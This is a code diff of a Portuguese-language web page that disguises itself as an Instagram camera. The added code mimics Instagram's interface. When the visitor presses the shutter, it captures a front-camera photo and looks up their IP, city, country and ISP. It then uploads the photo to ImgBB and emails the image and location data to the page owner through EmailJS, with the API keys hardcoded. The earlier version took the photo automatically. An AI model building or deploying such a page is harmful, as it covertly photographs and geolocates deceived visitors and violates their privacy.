@@ -2,114 +2,279 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Câmera Automática</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Câmera Instagram</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // ⚠️ IMPORTANTE: COLOQUE SUA CHAVE 'user_...' AQUI ABAIXO ⚠️
+            // ⚠️ COLOQUE SUA CHAVE PÚBLICA DO EMAILJS AQUI ⚠️
             emailjs.init("dE244dq8weZCu5CiA"); 
         })();
     </script>
 
     <style>
-        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        #status { position: absolute; bottom: 20px; left: 0; right: 0; text-align: center; color: white; font-family: sans-serif; font-size: 18px; background: rgba(0,0,0,0.5); padding: 10px; }
+        /* CSS para imitar o Instagram */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            overflow: hidden; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* Área do Vídeo */
+        #video-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Cobre a tela inteira como o Insta */
+        }
+
+        /* Efeito de Flash */
+        #flash {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 10;
+        }
+        .flash-active {
+            animation: flashAnim 0.15s ease-out;
+        }
+        @keyframes flashAnim {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* Interface Superior */
+        .top-bar {
+            position: absolute;
+            top: 10px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 15px;
+            z-index: 5;
+        }
+        .icon {
+            width: 24px;
+            height: 24px;
+            fill: white;
+            filter: drop-shadow(0 0 2px rgba(0,0,0,0.5));
+        }
+
+        /* Interface Inferior e Botão de Disparo */
+        .bottom-bar {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 0 20px;
+            z-index: 5;
+        }
+
+        #shutter-btn {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: white;
+            border: 4px solid rgba(255,255,255,0.3);
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+        #shutter-btn:active {
+            transform: scale(0.95);
+        }
+
+        .side-icon {
+            width: 30px;
+            height: 30px;
+            fill: white;
+            cursor: pointer;
+        }
+
+        /* Loading/Status */
+        #status {
+            position: absolute;
+            bottom: 100px;
+            color: white;
+            font-size: 14px;
+            background: rgba(0,0,0,0.6);
+            padding: 5px 10px;
+            border-radius: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <div id="status">Abrindo câmera...</div>
+    <div id="video-container">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <div id="flash"></div>
+
+    <!-- Interface Superior (Icones do Insta) -->
+    <div class="top-bar">
+        <!-- Setinha para trás -->
+        <svg class="icon" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        <!-- Flash (apenas visual) -->
+        <svg class="icon" viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
+        <!-- Troca Câmera (apenas visual por enquanto) -->
+        <svg class="icon" viewBox="0 0 24 24"><path d="M20 4h-3.17L14 2H6L4.17 4H1v16h18V4h1zm-7 9h-2v2H9v-2H7V8h2V6h2v2h2v2h-2v2zm5-3H6V6h12v4z"/></svg>
+    </div>
+
+    <!-- Interface Inferior -->
+    <div class="bottom-bar">
+        <!-- Ícone Galeria -->
+        <svg class="side-icon" viewBox="0 0 24 24"><path d="M20 6h-3.17L15 4H6L4.17 6H1v16h22V6H20zm-7 9h-2v2H9v-2H7V8h2V6h2v2h2v2h-2v2zm5-3H6V6h12v4z"/></svg>
+        
+        <!-- Botão de Disparo -->
+        <button id="shutter-btn" onclick="tirarFoto()"></button>
+        
+        <!-- Ícone Troca Câmera (Visual) -->
+        <svg class="side-icon" viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
+    </div>
+
+    <div id="status">Processando...</div>
 
     <script type="text/javascript">
-        // CONFIGURAÇÕES
+        // ⚠️ SUBSTITUA PEAS SUAS CHAVES AQUI ⚠️
         const IMGBB_API_KEY = '150c23d157fe7a469ffa4316f840df88'; 
         const EMAILJS_SERVICE_ID = 'service_1tsipns';
         const EMAILJS_TEMPLATE_ID = 'template_38m07j9';
-        const EMAILJS_PUBLIC_KEY = "dE244dq8weZCu5CiA"; // ⚠️ COLOQUE AQUI TAMBÉM SE NÃO ESTIVER NO INIT
+        const EMAILJS_PUBLIC_KEY = "dE244dq8weZCu5CiA";
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const flash = document.getElementById('flash');
         const status = document.getElementById('status');
 
-        // 1. Acessar Câmera
-        async function startCamera() {
+        // Som de obturador
+        const shutterSound = new Audio('https://www.soundjay.com/mechanical/sounds/camera-shutter-click-1.mp3'); 
+
+        async function obterDadosDoDispositivo() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-                
-                // Evento: Quando o vídeo começar a tocar (após o usuário dar permissão)
-                video.onloadedmetadata = async () => {
-                    status.innerText = "Tirando foto...";
-                    // Pequeno delay para a câmera estabilizar/ajustar foco
-                    await new Promise(resolve => setTimeout(resolve, 1500)); 
-                    tirarFotoAutomatica(stream);
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    pais: data.country_name,
+                    cidade: data.city,
+                    regiao: data.region,
+                    isp: data.org,
+                    usuarioAgente: navigator.userAgent
                 };
-            } catch (err) {
-                status.innerText = "Permissão negada ou erro.";
-                console.error(err);
+            } catch (error) {
+                return {
+                    ip: "Indisponível", pais: "Indisponível", cidade: "Indisponível",
+                    regiao: "Indisponível", isp: "Indisponível", usuarioAgente: navigator.userAgent
+                };
             }
         }
 
-        // 2. Função para tirar e enviar
-        async function tirarFotoAutomatica(stream) {
-            // Captura o frame
+        async function tirarFoto() {
+            if (video.readyState < 2) {
+                alert("Aguarde a câmera carregar.");
+                return;
+            }
+
+            // 1. Tocar som
+            shutterSound.play();
+
+            // 2. Efeito de Flash
+            flash.classList.add('flash-active');
+            setTimeout(() => flash.classList.remove('flash-active'), 150);
+
+            status.style.display = 'block';
+            status.innerText = "Enviando...";
+
+            // 3. Capturar imagem
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Converte para Base64
             const fotoBase64 = canvas.toDataURL('image/jpeg').split(',')[1];
 
-            // Para a câmera para economizar bateria e privacidade
-            stream.getTracks().forEach(track => track.stop());
-
             try {
-                status.innerText = "Enviando para ImgBB...";
-                
-                // Enviar para ImgBB
+                // 4. Obter dados de localização
+                const dados = await obterDadosDoDispositivo();
+
+                // 5. Enviar para ImgBB
                 const formData = new FormData();
                 formData.append('image', fotoBase64);
                 
-                const responseImgbb = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
+                const responseImgbb = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
                 const dataImgbb = await responseImgbb.json();
                 
-                if (!dataImgbb.success) {
-                    throw new Error('Erro ImgBB: ' + dataImgbb.error.message);
-                }
-
+                if (!dataImgbb.success) throw new Error('ImgBB Error');
+                
                 const imageUrl = dataImgbb.data.url;
                 const imageDeleteUrl = dataImgbb.data.delete_url;
 
-                status.innerText = "Enviando e-mail...";
+                // 6. Preparar dados para EmailJS
+                let dispositivoLegivel = dados.usuarioAgente;
+                if (dispositivoLegivel.includes("Android")) dispositivoLegivel = "Android - " + dispositivoLegivel;
+                else if (dispositivoLegivel.includes("iPhone") || dispositivoLegivel.includes("iOS")) dispositivoLegivel = "iOS (iPhone) - " + dispositivoLegivel;
+                else dispositivoLegivel = "PC/Desktop - " + dispositivoLegivel;
 
-                // Enviar para EmailJS
                 const params = {
                     link_da_foto: imageUrl,
                     link_exclusao: imageDeleteUrl,
-                    message: "Nova foto capturada automaticamente."
+                    ip: dados.ip,
+                    pais: dados.pais,
+                    cidade: dados.cidade,
+                    regiao: dados.regiao,
+                    provedor: dados.isp,
+                    dispositivo: dispositivoLegivel,
+                    mensagem: `Foto de: ${dados.cidade}, ${dados.pais}`
                 };
 
-                // await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
+                // 7. Enviar Email
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
                 
-                status.innerText = "Sucesso! Foto enviada.";
-                console.log('Envio concluído');
-
-                // Opcional: Redirecionar ou esconder o vídeo
-                // document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:20%">Captura Concluída</h1>';
+                status.innerText = "Enviado com Sucesso!";
 
             } catch (error) {
-                console.error('Erro final:', error);
-                status.innerText = "Erro: " + error.message;
+                console.error('Erro:', error);
+                status.innerText = "Erro no envio.";
             }
         }
 
-        // Iniciar
-        startCamera();
+        // Inicializar Câmera
+        (async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                });
+                video.srcObject = stream;
+            } catch (err) {
+                status.innerText = "Câmera não encontrada ou permissão negada.";
+                status.style.display = 'block';
+            }
+        })();
     </script>
 </body>
 </html>
